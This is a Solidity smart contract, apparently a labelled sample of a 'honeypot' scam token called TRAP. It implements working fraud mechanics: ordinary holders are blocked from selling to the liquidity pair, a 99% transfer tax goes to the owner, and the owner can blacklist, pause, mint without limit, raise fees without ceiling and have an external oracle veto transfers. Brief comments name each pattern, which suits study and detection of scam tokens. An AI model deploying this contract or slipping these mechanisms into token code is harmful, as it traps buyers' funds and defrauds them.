// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title HoneypotToken
 * @dev Malicious token contract demonstrating classic honeypot attack patterns
 */
interface ITokenFilter {
    function canTransfer(address sender, address recipient) external view returns (bool);
}

contract HoneypotToken {
    string public name = "Scam Honeypot Token";
    string public symbol = "TRAP";
    uint8 public decimals = 18;
    uint256 public totalSupply = 10000000 * 10**18;
    address public owner;
    address public uniswapV2Pair;
    address public securityOracle;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isBlacklisted;
    mapping(address => bool) public canSell;
    mapping(address => uint256) public _holderLastTransferTimestamp;

    uint256 public sellTax = 99; // 99% excessive tax
    uint256 public maxTxAmount = 1000 * 10**18;
    bool public paused = false;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier notBlacklisted(address account) {
        require(!isBlacklisted[account], "Address blacklisted");
        _;
    }

    constructor(address _pair, address _oracle) {
        owner = msg.sender;
        uniswapV2Pair = _pair;
        securityOracle = _oracle;
        balanceOf[msg.sender] = totalSupply;
        canSell[msg.sender] = true;
    }

    function setBlacklist(address account, bool state) external onlyOwner {
        isBlacklisted[account] = state;
    }

    function setSellTax(uint256 newTax) external onlyOwner {
        // Unbounded fee setter: no ceiling check!
        sellTax = newTax;
    }

    function pause() external onlyOwner {
        paused = true;
    }

    function mint(address account, uint256 amount) external onlyOwner {
        // Hidden unconstrained mint privilege
        totalSupply += amount;
        balanceOf[account] += amount;
    }

    function transfer(address recipient, uint256 amount) external notBlacklisted(msg.sender) returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(!paused, "Transfers paused");
        require(amount <= maxTxAmount, "Exceeds max transaction limit");

        // External permission restriction call
        if (securityOracle != address(0)) {
            require(ITokenFilter(securityOracle).canTransfer(from, to), "External filter denied transfer");
        }

        // Asymmetric sell restriction: ordinary holders cannot sell to liquidity pair
        if (to == uniswapV2Pair) {
            require(canSell[from], "Sells are not permitted for this wallet");
        }

        // Excessive tax applied on transfers
        uint256 fee = (amount * sellTax) / 100;
        uint256 transferAmount = amount - fee;

        // Suspicious inline assembly manipulating storage or memory
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, caller())
        }

        balanceOf[from] -= amount;
        balanceOf[to] += transferAmount;
        balanceOf[owner] += fee;

        emit Transfer(from, to, transferAmount);
    }
}
